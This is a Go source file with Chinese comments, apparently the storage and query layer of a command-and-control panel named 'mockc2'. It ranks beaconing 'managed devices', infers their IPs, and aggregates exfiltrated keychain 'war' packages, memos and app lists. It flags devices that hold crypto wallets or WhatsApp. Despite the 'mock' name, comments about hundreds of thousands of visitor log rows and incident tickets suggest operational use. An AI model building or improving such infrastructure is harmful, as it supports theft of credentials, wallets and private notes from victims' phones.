package store

import (
	"math"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"mockc2/internal/config"
)

var tsRe = regexp.MustCompile(`^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$`)
var deviceUUIDRe = regexp.MustCompile(`device_uuid["\s:]+([\w-]+)`)

const tsFmt = "2006-01-02 15:04:05"

func capRoot() string { return config.Get().CaptureRoot }

// ── 设备列表（全 DB 批量解析，消除 N+1 查询与文件 IO）──
//
// 旧版对每台设备做 warIndex/Profile/walletsMeta/nbCount/uCount 共 6+ 次独立查询，
// 其中 warIndex 读 war 文件头、walletsMeta 读最多 6 个 u 包大文件并 JSON 反序列化。
// 设备数增长后这些 N+1 + 文件 IO 会打满 SQLite 连接池并占满 CPU，
// 拖慢同库上的投递链写操作（access_log/devices/packets 入库排队）。
// 新版：设备身份 + beacon 时间一次查询；war/notes/apps/wallets/profile 各一次批量聚合；
// 全部走 DB（v8/v9 已把实体落库），不再读回传文件。
// listDevicesCache ListDevices 结果缓存（stale-while-revalidate）。
//
// ListDevices 被 /panel/api/devices、/api/list?type=managed、AggStats（overview）
// 与看板高频调用，每次都要跑 6 组万级聚合 + 万级设备循环。实测（INC-20260930-02，
// 远程 12 次连续轮询）：TTL 过期后的同步重算会间歇性冲到 20~26s，前端 25s 超时
// 直接报"无法连接后端服务"。改为 SWR：过期先回旧数据 + 后台异步重算，读路径永不
// 同步等重算；仅冷启动（无任何旧数据）才同步构建一次。
// 约定：调用方只读，不得修改返回的 map（内部共享同一份）。
var listDevicesCache struct {
	mu         sync.RWMutex
	data       []map[string]any
	expire     time.Time
	refreshing atomic.Bool
}

// ListDevices 设备台账（SWR 缓存；TTL 10s，过期后台刷新，见 listDevicesCache 注释）。
func ListDevices() []map[string]any {
	listDevicesCache.mu.RLock()
	if time.Now().Before(listDevicesCache.expire) {
		d := listDevicesCache.data
		listDevicesCache.mu.RUnlock()
		return d
	}
	stale := listDevicesCache.data
	listDevicesCache.mu.RUnlock()

	// 过期但有旧数据：立即回旧值，后台异步重算（并发触发只放行一个刷新者）
	if stale != nil {
		if listDevicesCache.refreshing.CompareAndSwap(false, true) {
			go func() {
				defer listDevicesCache.refreshing.Store(false)
				d := listDevicesUncached()
				if len(d) > 0 {
					listDevicesCache.mu.Lock()
					listDevicesCache.data = d
					listDevicesCache.expire = time.Now().Add(10 * time.Second)
					listDevicesCache.mu.Unlock()
				}
			}()
		}
		return stale
	}

	// 冷启动：无任何旧数据，必须同步构建（保留 double-check 防并发重复构建）
	listDevicesCache.mu.Lock()
	defer listDevicesCache.mu.Unlock()
	if listDevicesCache.data != nil && time.Now().Before(listDevicesCache.expire) {
		return listDevicesCache.data
	}
	d := listDevicesUncached()
	listDevicesCache.data = d
	listDevicesCache.expire = time.Now().Add(10 * time.Second)
	return d
}

// WarmCaches 预热高频聚合缓存（设备列表 + 阶段进度）。
//
// 重启后首个请求否则要独自承担全量聚合：ClientStageProgress 对 54 万行 access_log
// 做 GROUP BY，加上 6 组万级聚合，实测 6s+ —— 观感就是"一部署就卡"。
// 由启动后台任务在历史回填完成后调用（此时 DB 竞争已结束）。
func WarmCaches() {
	_ = ListDevices()
	_ = ClientStageProgress()
}

func listDevicesUncached() []map[string]any {
	db := GetDB()
	if db == nil {
		return []map[string]any{}
	}
	// 读模型：device_stats（每设备一行，入库时增量维护）——请求路径不再对 packet_meta 现场 GROUP BY。
	rows := db.Query(`
        SELECT uuid, first_seen, last_seen, beacon_epoch, notes_count, apps_count
        FROM device_stats ORDER BY last_seen DESC, uuid ASC`)
	useStats := len(rows) > 0
	if !useStats {
		// 回退：物化表尚未回填时，退回旧现场聚合（行为不变）。
		rows = db.Query(`
        SELECT m.value AS uuid,
               MIN(NULLIF(p.first_recv_ts,'')) AS first_seen,
               MAX(p.recv_ts) AS last_seen,
               MAX(CASE WHEN p.endpoint='beacon' THEN p.recv_epoch END) AS beacon_epoch,
               0 AS notes_count, 0 AS apps_count
        FROM packet_meta m JOIN packets p ON p.id = m.packet_id
        WHERE m.field IN ('uuid','lhu') AND p.endpoint IN ('beacon','a') AND m.value<>''
        GROUP BY m.value ORDER BY last_seen DESC, m.value ASC`)
	}
	if len(rows) == 0 {
		return []map[string]any{}
	}

	// 批量聚合（各一次查询；计数在 useStats 时直接取 device_stats）
	warFiles, _ := devicesWarAgg()
	notesAgg := map[string]int{}
	appsAgg := map[string]int{}
	if !useStats {
		notesAgg = devicesNotesCountAgg()
		appsAgg = devicesAppsCountAgg()
	}
	wallets := devicesWalletsAgg()
	profiles := devicesProfileAgg()
	walletFlags := deviceWalletFlagAgg()
	watchApps := devicesWhatsAppAgg()

	// 就近 IP 推断：走 last_seen 索引的定点查询（O(log n)）。
	// 旧实现把 devices 台账整表加载进内存做 O(N) 线性扫、再对每台无档案设备
	// 各扫一遍 —— 台账随公网访客无界增长后是 O(N²)，是看板重建冲到 20s+ 的主因之一。
	// （ix_devices_last_seen 索引见 schema.go baselineDDL）

	nowT := nowEpoch()
	progress := ClientStageProgress()
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		uuid := toStr(r["uuid"])
		beaconEpoch := toFloat(r["beacon_epoch"])
		online := beaconEpoch != 0 && (nowT-beaconEpoch) <= 1800
		hasWallet := toInt(walletFlags[uuid]) > 0 || len(wallets[uuid]) > 0
		noteCount := int(toInt(r["notes_count"]))
		appCount := int(toInt(r["apps_count"]))
		if !useStats {
			noteCount = notesAgg[uuid]
			appCount = appsAgg[uuid]
		}
		d := map[string]any{
			"uuid":        uuid,
			"first_seen":  r["first_seen"],
			"last_seen":   r["last_seen"],
			"online":      online,
			"war_count":   len(warFiles[uuid]),
			"war_files":   warFiles[uuid],
			"wallets":     wallets[uuid],
			"has_wallet":  hasWallet,
			"wallet_hits": toInt(walletFlags[uuid]),
			"notes_count": noteCount,
			"apps_count":  appCount,
			"ws":          watchApps[uuid],
		}
		// 档案字段（machine/deviceName/ios/build/status/src_ip）先拷贝，
		// IP 链必须在拷贝【之后】计算 —— 否则档案里设备自报的空 ip 会把
		// 已填充的 src_ip/推断值反向覆盖掉（INC-20260930-02 附带缺陷）。
		for k, v := range profiles[uuid] {
			d[k] = v
		}
		// IP 展示链：device_profiles 自报（设备权威）→ src_ip 服务器实测 → nearestIPAt 时间近邻推断
		ip := toStr(profiles[uuid]["ip"])
		if ip == "" {
			ip = toStr(profiles[uuid]["src_ip"])
		}
		if ip == "" {
			ip = nearestIPAt(toStr(r["last_seen"]))
		}
		d["ip"] = ip
		pct := progress[ip]
		d["progress"] = pct
		d["stage"] = StageNameForPercent(pct)
		out = append(out, d)
	}
	return out
}

// ListDevicesPaged 设备台账分页视图（服务端分页 + 关键词/钱包筛选）。
//
// 背景：/panel/api/devices 原先一次性回传全部设备，设备数增长后 JSON 传输 +
// el-table 全量渲染都会拖慢页面（前端"全加载"卡顿的根源）。
// 数据源沿用 ListDevices 的 3s TTL 缓存（全量聚合成本由缓存承担，本函数只做
// 内存筛选与切片），每页只回传 per 台（默认 20），渲染与传输量恒定。
//
// 语义对齐旧前端：
//   - kw 命中字段：uuid / ip / deviceName / machine / ios / build（大小写不敏感）
//   - wallet：all | wallet（仅有钱包）| none（仅无钱包），以 wallets 列表为准
//   - 稳定排序：first_seen 倒序 + uuid 兜底（不用 last_seen，避免轮询行序乱跳）
//
// 约定：调用方只读，不得修改返回的 map（与 ListDevices 共享同一份底层数据）。
func ListDevicesPaged(page, per int, kw, wallet string) map[string]any {
	rows, total, walletTotal := pageDevices(ListDevices(), page, per, kw, wallet)
	return map[string]any{
		"devices":      rows,
		"total":        total,
		"page":         clampPage(page),
		"per":          clampPer(per),
		"wallet_count": walletTotal,
	}
}

// pageDevices 纯函数：筛选 + 稳定排序 + 分页切片（无 DB/缓存依赖，便于单测）。
// 返回 当前页行、筛选后总数、全量钱包设备数。
func pageDevices(all []map[string]any, page, per int, kw, wallet string) ([]map[string]any, int, int) {
	page, per = clampPage(page), clampPer(per)

	// 钱包设备总数（全量口径，与当前筛选无关；头部 chip 用）
	walletTotal := 0
	for _, d := range all {
		if len(deviceWalletsOf(d)) > 0 {
			walletTotal++
		}
	}

	k := strings.ToLower(strings.TrimSpace(kw))
	rows := make([]map[string]any, 0, len(all))
	for _, d := range all {
		n := len(deviceWalletsOf(d))
		switch wallet {
		case "wallet":
			if n == 0 {
				continue
			}
		case "none":
			if n > 0 {
				continue
			}
		}
		if k != "" {
			hit := false
			for _, f := range []any{d["uuid"], d["ip"], d["deviceName"], d["machine"], d["ios"], d["build"]} {
				if strings.Contains(strings.ToLower(toStr(f)), k) {
					hit = true
					break
				}
			}
			if !hit {
				continue
			}
		}
		rows = append(rows, d)
	}

	// 稳定排序：first_seen 倒序（新设备在上）+ uuid 兜底。
	// 刻意不用 last_seen —— 设备每次 beacon 都会改变它，导致列表行随轮询乱跳、点不准。
	sort.SliceStable(rows, func(i, j int) bool {
		fa, fb := toStr(rows[i]["first_seen"]), toStr(rows[j]["first_seen"])
		if fa != fb {
			return fb < fa
		}
		return toStr(rows[i]["uuid"]) < toStr(rows[j]["uuid"])
	})

	total := len(rows)
	start, end := pageBounds(page, per, total)
	pageRows := rows[start:end]
	if pageRows == nil {
		pageRows = []map[string]any{}
	}
	return pageRows, total, walletTotal
}

func clampPage(page int) int {
	if page < 1 {
		return 1
	}
	return page
}

func clampPer(per int) int {
	if per < 1 {
		return 20
	}
	if per > 1000 {
		return 1000
	}
	return per
}

// deviceWalletsOf 取设备行的钱包列表（nil-safe）。
func deviceWalletsOf(d map[string]any) []map[string]any {
	if ws, ok := d["wallets"].([]map[string]any); ok {
		return ws
	}
	return nil
}

// pageBounds 计算分页切片边界 [start,end)；越界收敛，不 panic。
func pageBounds(page, per, total int) (int, int) {
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	if start > total {
		start = total
	}
	end := start + per
	if end > total {
		end = total
	}
	return start, end
}

// nearestIPAt 在 devices 台账里找与 target 最接近（±30min）的来访 IP；
// 窗口外回退台账最新一条。全部走 ix_devices_last_seen 索引定点查询，
// 不再整表加载（旧 O(N²) 实现见 git 历史）。
func nearestIPAt(target string) string {
	db := GetDB()
	if tsRe.MatchString(target) {
		before := db.QueryOne(
			"SELECT ip, last_seen FROM devices WHERE ip<>'' AND last_seen <= ?"+
				" ORDER BY last_seen DESC LIMIT 1", target)
		after := db.QueryOne(
			"SELECT ip, last_seen FROM devices WHERE ip<>'' AND last_seen > ?"+
				" ORDER BY last_seen ASC LIMIT 1", target)
		best, bestd := "", math.MaxFloat64
		for _, r := range []map[string]any{before, after} {
			if r == nil {
				continue
			}
			lt, err := time.ParseInLocation(tsFmt, toStr(r["last_seen"]), time.Local)
			if err != nil {
				continue
			}
			if d := math.Abs(lt.Sub(mustParse(target)).Seconds()); d < bestd {
				best, bestd = toStr(r["ip"]), d
			}
		}
		if best != "" && bestd <= 1800 {
			return best
		}
	}
	if latest := db.QueryOne(
		"SELECT ip FROM devices WHERE ip<>'' ORDER BY last_seen DESC LIMIT 1"); latest != nil {
		return toStr(latest["ip"])
	}
	return ""
}

func mustParse(ts string) time.Time {
	t, err := time.ParseInLocation(tsFmt, ts, time.Local)
	if err != nil {
		return time.Time{}
	}
	return t
}

// devicesWarAgg 批量聚合 war 包文件与计数（按 lhu/uuid 关联；实体已落库，不读文件头验证）。
func devicesWarAgg() (map[string][]map[string]any, map[string]int) {
	db := GetDB()
	files := map[string][]map[string]any{}
	counts := map[string]int{}
	for _, r := range db.Query(`
        SELECT m.value AS uuid, p.id AS packet_id, p.recv_ts, p.file_path, p.size
        FROM packet_meta m JOIN packets p ON p.id = m.packet_id
        WHERE p.endpoint='war' AND m.field IN ('lhu','uuid') AND m.value<>''
        ORDER BY p.recv_epoch DESC`) {
		uuid := toStr(r["uuid"])
		fp := toStr(r["file_path"])
		base := fp
		if i := strings.LastIndex(fp, "/"); i >= 0 {
			base = fp[i+1:]
		}
		files[uuid] = append(files[uuid], map[string]any{
			"packet_id": r["packet_id"], "file": base,
			"ts": r["recv_ts"], "size": r["size"]})
		counts[uuid]++
	}
	return files, counts
}

// devicesNotesCountAgg 批量聚合 nb 端点的 list_count（备忘录条数）。
func devicesNotesCountAgg() map[string]int {
	db := GetDB()
	out := map[string]int{}
	for _, r := range db.Query(`
        SELECT m.value AS uuid, COALESCE(SUM(CAST(m2.value AS SIGNED)),0) AS n
        FROM packets p
        JOIN packet_meta m  ON m.packet_id=p.id AND m.field IN ('lhu','uuid')
        JOIN packet_meta m2 ON m2.packet_id=p.id AND m2.field='list_count'
        WHERE p.endpoint='nb'
        GROUP BY m.value`) {
		out[toStr(r["uuid"])] = int(toInt(r["n"]))
	}
	return out
}

// devicesAppsCountAgg 批量聚合 u 端点的 apps_count（应用条数）。
func devicesAppsCountAgg() map[string]int {
	db := GetDB()
	out := map[string]int{}
	for _, r := range db.Query(`
        SELECT m.value AS uuid, COALESCE(SUM(CAST(m2.value AS SIGNED)),0) AS n
        FROM packets p
        JOIN packet_meta m  ON m.packet_id=p.id AND m.field IN ('lhu','uuid')
        JOIN packet_meta m2 ON m2.packet_id=p.id AND m2.field='apps_count'
        WHERE p.endpoint='u'
        GROUP BY m.value`) {
		out[toStr(r["uuid"])] = int(toInt(r["n"]))
	}
	return out
}

// devicesWalletsAgg 批量聚合钱包命中：wallet_seen 快照。来源两条：
// ① war 包 keychain.wallets 桶（ProcessWar）；② apps.bundle_id × wallet_rules 配对反推
// （MatchWalletsFromApps —— war 桶为空时钱包字段的唯一可靠来源）。
// 并把命中规则回配到该设备实际安装的包名（bundle_ids），供前端"钱包 ↔ 包名"对照展示。
func devicesWalletsAgg() map[string][]map[string]any {
	db := GetDB()
	agg := map[string]map[string]any{}
	for _, r := range db.Query(
		"SELECT device_uuid, rule_name, MAX(count) AS cnt FROM wallet_seen" +
			" WHERE device_uuid<>'' GROUP BY device_uuid, rule_name") {
		uuid := toStr(r["device_uuid"])
		rn := toStr(r["rule_name"])
		if uuid == "" || rn == "" {
			continue
		}
		if agg[uuid] == nil {
			agg[uuid] = map[string]any{}
		}
		agg[uuid][rn] = map[string]any{"rule": rn, "display": Display(rn), "count": toInt(r["cnt"])}
	}
	// 只对"有钱包命中"的设备取包名配对（避免全表 apps 扫描）
	uuids := make([]string, 0, len(agg))
	for u := range agg {
		uuids = append(uuids, u)
	}
	bundles := walletBundlesByDevice(uuids)
	// 转 []map 并按 count 降序
	out := map[string][]map[string]any{}
	for uuid, m := range agg {
		list := make([]map[string]any, 0, len(m))
		for _, v := range m {
			if wm, ok := v.(map[string]any); ok {
				if bs := bundles[uuid][toStr(wm["rule"])]; len(bs) > 0 {
					wm["bundle_ids"] = bs
				}
				list = append(list, wm)
			}
		}
		sort.Slice(list, func(i, j int) bool { return toInt(list[i]["count"]) > toInt(list[j]["count"]) })
		out[uuid] = list
	}
	return out
}

// walletBundlesByDevice 对指定设备集合，把命中的钱包规则回配到实际安装的包名。
// 返回 uuid → rule_name → []bundle_id（升序）。只查给定 uuid，不做全表扫描。
func walletBundlesByDevice(uuids []string) map[string]map[string][]string {
	out := map[string]map[string][]string{}
	if len(uuids) == 0 {
		return out
	}
	ph := strings.TrimSuffix(strings.Repeat("?,", len(uuids)), ",")
	args := make([]any, 0, len(uuids))
	for _, u := range uuids {
		args = append(args, u)
	}
	for _, r := range GetDB().Query(
		"SELECT DISTINCT uuid, bundle_id FROM apps WHERE uuid IN ("+ph+")", args...) {
		u := toStr(r["uuid"])
		b := toStr(r["bundle_id"])
		if u == "" || b == "" {
			continue
		}
		rule := matchWalletRule(b)
		if rule == "" {
			continue
		}
		if out[u] == nil {
			out[u] = map[string][]string{}
		}
		out[u][rule] = append(out[u][rule], b)
	}
	for u := range out {
		for rule := range out[u] {
			sort.Strings(out[u][rule])
		}
	}
	return out
}

// deviceWalletFlagAgg 设备钱包命中映射（device_wallet_flags 一次查询 → uuid→hits）。
// 设备列表"是否有钱包（有/无）"以该表为准（无行 = 无）；迁移 v3 已从历史数据回填。
func deviceWalletFlagAgg() map[string]int {
	db := GetDB()
	out := map[string]int{}
	for _, r := range db.Query("SELECT uuid, wallet_hits FROM device_wallet_flags") {
		out[toStr(r["uuid"])] = int(toInt(r["wallet_hits"]))
	}
	return out
}

// devicesWhatsAppAgg WS 判定：设备是否装有 WhatsApp（按应用资产包名映射）。
// WhatsApp 官方包名：iOS `net.whatsapp.WhatsApp`、Android `com.whatsapp`（含
// Business `com.whatsapp.w4b`），统一按 LOWER(bundle_id) LIKE '%whatsapp%' 命中。
func devicesWhatsAppAgg() map[string]bool {
	out := map[string]bool{}
	for _, r := range GetDB().Query(
		"SELECT DISTINCT uuid FROM apps WHERE LOWER(bundle_id) LIKE '%whatsapp%'") {
		u := toStr(r["uuid"])
		if u != "" {
			out[u] = true
		}
	}
	return out
}

// devicesProfileAgg 批量聚合设备档案：device_profiles（machine/ios/build/deviceName）+ 最新 beacon status。
func devicesProfileAgg() map[string]map[string]any {
	db := GetDB()
	out := map[string]map[string]any{}
	// ① device_profiles（a 端点完整档案，v8 落库）：含权威 ip，避免 nearIP 推断漂移
	for _, r := range db.Query(
		"SELECT uuid, machine, device_name, ios_version, build_version, ip FROM device_profiles") {
		out[toStr(r["uuid"])] = map[string]any{
			"machine":    toStr(r["machine"]),
			"ios":        toStr(r["ios_version"]),
			"build":      toStr(r["build_version"]),
			"deviceName": toStr(r["device_name"]),
			"ip":         toStr(r["ip"]),
		}
	}
	// ② status：最新 beacon 包的 status 字段
	for _, r := range db.Query(`
        SELECT m.value AS uuid, m2.value AS status
        FROM packet_meta m
        JOIN packets p ON p.id = m.packet_id AND p.endpoint='beacon'
        JOIN packet_meta m2 ON m2.packet_id = p.id AND m2.field='status'
        WHERE m.field='uuid' AND p.recv_epoch = (
            SELECT MAX(p2.recv_epoch) FROM packets p2
            JOIN packet_meta m3 ON m3.packet_id = p2.id AND m3.field='uuid' AND m3.value=m.value
            WHERE p2.endpoint='beacon'
        )`) {
		uuid := toStr(r["uuid"])
		if out[uuid] == nil {
			out[uuid] = map[string]any{}
		}
		out[uuid]["status"] = toStr(r["status"])
	}
	// ③ src_ip：服务器侧观测的连接来源 IP（ingest 时由 clientIP 记录）。
	// 设备 /a 自报 ip 缺失率 ~10%，src_ip 是权威补位（每台取最新一包的来源）。
	for _, r := range db.Query(`
        SELECT uuid, src_ip FROM (
            SELECT m.value AS uuid, m2.value AS src_ip,
                   ROW_NUMBER() OVER (PARTITION BY m.value ORDER BY p.recv_epoch DESC) AS rn
            FROM packet_meta m
            JOIN packets p ON p.id = m.packet_id AND p.endpoint IN ('beacon','a')
            JOIN packet_meta m2 ON m2.packet_id = p.id AND m2.field='src_ip'
            WHERE m.field IN ('uuid','lhu') AND m.value<>''
        ) t WHERE rn = 1`) {
		uuid := toStr(r["uuid"])
		if out[uuid] == nil {
			out[uuid] = map[string]any{}
		}
		out[uuid]["src_ip"] = toStr(r["src_ip"])
	}
	return out
}

// Profile 从最新 beacon/a 包的 packet_meta 补 machine/ios/build/status，并以
// device_profiles（a 端点完整落库档案）兜底补全空字段。
func Profile(uuid string) map[string]any {
	db := GetDB()
	metas := map[string]string{}
	if row := db.QueryOne(`
        SELECT p.id FROM packet_meta m JOIN packets p ON p.id=m.packet_id
        WHERE m.field IN ('uuid','lhu') AND m.value=? AND p.endpoint IN ('beacon','a')
        ORDER BY p.recv_epoch DESC LIMIT 1`, uuid); row != nil {
		for _, m := range db.Query("SELECT field, value FROM packet_meta WHERE packet_id=?", toInt(row["id"])) {
			metas[toStr(m["field"])] = toStr(m["value"])
		}
	}
	machine := metas["machine"]
	deviceName := metas["hostname"]
	ios := metas["ios_version"]
	build := metas["build_version"]
	// 兜底：beacon/a 包的 packet_meta 字段不全（a 缺 hostname/ios/build，beacon 缺 machine），
	// 统一以 device_profiles 补齐空字段，避免机型/设备名/iOS 显示为空或回退错误。
	if p := db.QueryOne(
		"SELECT machine, device_name, ios_version, build_version FROM device_profiles WHERE uuid=?", uuid); p != nil {
		if machine == "" {
			machine = toStr(p["machine"])
		}
		if deviceName == "" {
			deviceName = toStr(p["device_name"])
		}
		if ios == "" {
			ios = toStr(p["ios_version"])
		}
		if build == "" {
			build = toStr(p["build_version"])
		}
	}
	return map[string]any{"machine": machine, "ios": ios,
		"build": build, "status": metas["status"], "deviceName": deviceName}
}

// ── war / 钱包 ──
func warIndex(lhu string) ([]map[string]any, int) {
	db := GetDB()
	rows := db.Query(`
        SELECT p.id, p.recv_ts, p.file_path, p.size
        FROM packets p JOIN packet_meta m ON m.packet_id=p.id
        WHERE p.endpoint='war' AND m.field IN ('lhu','uuid') AND m.value=?
        ORDER BY p.recv_epoch DESC`, lhu)
	files := []map[string]any{}
	for _, r := range rows {
		fp := toStr(r["file_path"])
		base := fp
		if i := strings.LastIndex(fp, "/"); i >= 0 {
			base = fp[i+1:]
		}
		files = append(files, map[string]any{"packet_id": r["id"], "file": base,
			"ts": r["recv_ts"], "size": r["size"]})
	}
	return files, len(files)
}

// walletsMeta 单设备钱包命中（wallet_seen 快照：war 桶 + apps 包名配对反推），
// 并把命中规则回配到该设备实际安装的包名（bundle_ids）。
func walletsMeta(lhu string) []map[string]any {
	db := GetDB()
	out := map[string]map[string]any{}
	for _, r := range db.Query(
		"SELECT rule_name, MAX(count) AS cnt FROM wallet_seen"+
			" WHERE device_uuid=? GROUP BY rule_name", lhu) {
		rn := toStr(r["rule_name"])
		out[rn] = map[string]any{"rule": rn, "display": Display(rn), "count": toInt(r["cnt"])}
	}
	bundles := walletBundlesByDevice([]string{lhu})[lhu]
	list := make([]map[string]any, 0, len(out))
	for _, v := range out {
		if bs := bundles[toStr(v["rule"])]; len(bs) > 0 {
			v["bundle_ids"] = bs
		}
		list = append(list, v)
	}
	sort.Slice(list, func(i, j int) bool { return toInt(list[i]["count"]) > toInt(list[j]["count"]) })
	return list
}

func nbCount(lhu string) int {
	row := GetDB().QueryOne(`
        SELECT COALESCE(SUM(CAST(m2.value AS SIGNED)),0) AS n
        FROM packets p
        JOIN packet_meta m ON m.packet_id=p.id AND m.field='lhu' AND m.value=?
        JOIN packet_meta m2 ON m2.packet_id=p.id AND m2.field='list_count'
        WHERE p.endpoint='nb'`, lhu)
	if row == nil {
		return 0
	}
	return int(toInt(row["n"]))
}

func uCount(lhu string) int {
	row := GetDB().QueryOne(`
        SELECT COALESCE(SUM(CAST(m2.value AS SIGNED)),0) AS n
        FROM packets p
        JOIN packet_meta m ON m.packet_id=p.id AND m.field='lhu' AND m.value=?
        JOIN packet_meta m2 ON m2.packet_id=p.id AND m2.field='apps_count'
        WHERE p.endpoint='u'`, lhu)
	if row == nil {
		return 0
	}
	return int(toInt(row["n"]))
}

// ── 设备资产钻取 ──
func DeviceAssets(lhu string) map[string]any {
	wf, wc := warIndex(lhu)
	wallets := walletsMeta(lhu)
	names := make([]string, 0, len(wallets))
	for _, w := range wallets {
		names = append(names, toStr(w["display"]))
	}
	return map[string]any{"uuid": lhu, "profile": Profile(lhu),
		"wallets": wallets, "wallet_names": names,
		"war_files": wf, "war_count": wc,
		"notes_count": nbCount(lhu), "apps_count": uCount(lhu)}
}

// ── 备忘录：只显示解析结果 ──
// 直读 memos 表（parseMemos 落库的结构化行）。旧实现查 packets 拿文件路径后
// 逐个 os.ReadFile 读最多 200 个 capture 文件再现场 JSON 解析 —— 库里有现成
// 结构化数据还去读盘，是看板/列表高轮询下的典型双读坏味道。
func NoteRows(kw string, page, per int) map[string]any {
	db := GetDB()
	sql := "SELECT m.note_id, m.title, m.snippet, m.mod_ts, m.uuid, m.last_seen AS ts FROM memos m"
	args := []any{}
	if kw != "" {
		k := strings.ToLower(kw)
		sql += " WHERE LOWER(m.title) LIKE ? OR LOWER(m.snippet) LIKE ? OR LOWER(m.uuid) LIKE ?"
		args = append(args, "%"+k+"%", "%"+k+"%", "%"+k+"%")
	}
	sql += " ORDER BY m.last_seen DESC, m.note_id DESC LIMIT 500"
	queried := db.Query(sql, args...)
	rows := make([]map[string]any, 0, len(queried))
	for _, r := range queried {
		rows = append(rows, map[string]any{
			"id": r["note_id"], "title": toStr(r["title"]), "snippet": toStr(r["snippet"]),
			"mod": toStr(r["mod_ts"]), "ts": toStr(r["ts"]), "lhu": toStr(r["uuid"]),
		})
	}
	total := len(rows)
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	end := start + per
	if start > total {
		start = total
	}
	if end > total {
		end = total
	}
	return map[string]any{"total": total, "page": page, "rows": rows[start:end]}
}

func fmtMod(v any) string {
	n := toInt(v)
	if n == 0 {
		return "-"
	}
	return time.Unix(n, 0).Format(tsFmt)
}

// ── 仪表盘汇总（DB） ──
func AggStats() map[string]any {
	db := GetDB()
	visits := int(toInt(db.QueryOne(
		"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices")["n"]))
	// 今日新增：台账（来访登记）与托管设备分别按 first_seen 当日
	today := time.Now().Format(tsFmt)[:10]
	visitsToday := int(toInt(db.QueryOne(
		"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
			" WHERE SUBSTR(first_seen,1,10)=?", today)["n"]))
	// 在线数不再单独写一条 SQL —— 直接数 ListDevices 里 online=true 的设备，
	// 保证"总览的在线"与"设备列表的在线点"永远同口径。
	// （旧实现用 field='uuid' 单独统计，与列表的 field IN ('uuid','lhu') 不一致，
	//   实测差 1 台：beacon 把 uuid 写在 lhu 字段的设备被漏掉。）
	devs := ListDevices()
	newDevices := int64(0)
	for _, d := range devs {
		if strings.HasPrefix(toStr(d["first_seen"]), today) {
			newDevices++
		}
	}
	notesRow := db.QueryOne("SELECT COALESCE(SUM(CAST(value AS SIGNED)),0) n FROM packet_meta" +
		" WHERE field='list_count' AND packet_id IN" +
		"  (SELECT id FROM packets WHERE endpoint='nb')")
	warRow := db.QueryOne("SELECT COUNT(*) n FROM packets WHERE endpoint='war'")
	appsRow := db.QueryOne("SELECT COUNT(*) n FROM packets WHERE endpoint='u'")

	st := map[string]any{
		"visits":       visits,
		"visits_today": visitsToday,
		"new_devices":  newDevices,
		"devices":      len(devs),
		"online":       0, // 稍后用 onlineDevices 长度回填（与设备列表同口径）
		"notes":        toInt(notesRow["n"]),
		"war":          toInt(warRow["n"]),
		"apps_pkg":     toInt(appsRow["n"]),
	}
	counts := map[string]any{}
	for _, r := range db.Query("SELECT endpoint, COUNT(*) AS n FROM packets GROUP BY endpoint") {
		counts[toStr(r["endpoint"])] = r["n"]
	}
	onlineDevices := []map[string]any{}
	onlineJournal := []string{}
	for _, d := range devs {
		if b, _ := d["online"].(bool); b {
			od := map[string]any{}
			for _, k := range []string{"uuid", "machine", "ios", "first_seen", "last_seen"} {
				od[k] = d[k]
			}
			onlineDevices = append(onlineDevices, od)
			onlineJournal = append(onlineJournal, toStr(d["uuid"]))
		}
	}
	st["counts"] = counts
	st["online"] = len(onlineDevices)
	st["online_devices"] = onlineDevices
	st["online_journal"] = onlineJournal
	return st
}
